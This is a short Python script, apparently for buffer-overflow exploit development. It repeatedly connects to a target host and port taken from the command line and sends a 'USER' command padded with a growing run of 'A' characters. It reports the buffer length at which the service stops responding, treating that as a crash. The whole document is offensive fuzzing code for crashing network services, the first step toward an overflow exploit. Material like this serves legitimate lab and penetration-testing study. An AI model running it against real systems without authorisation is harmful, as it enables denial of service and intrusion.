import sys, socket
from time import sleep
 
target = sys.argv[1]
port = int(sys.argv[2])
buff = "A"*50
 
while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target,port))
        s.recv(1024)
        print("Sending buffer with length: {}".format(len(buff)))
        s.send("USER "+buff+"\r\n")
        s.close()
        sleep(1)
        buff = buff + "A"*50
    except: # If we fail to connect to the server, we'll assume it is crashed
        print("[+] Crash  with buffer: {}".format(len(buff)-50))
        sys.exit()
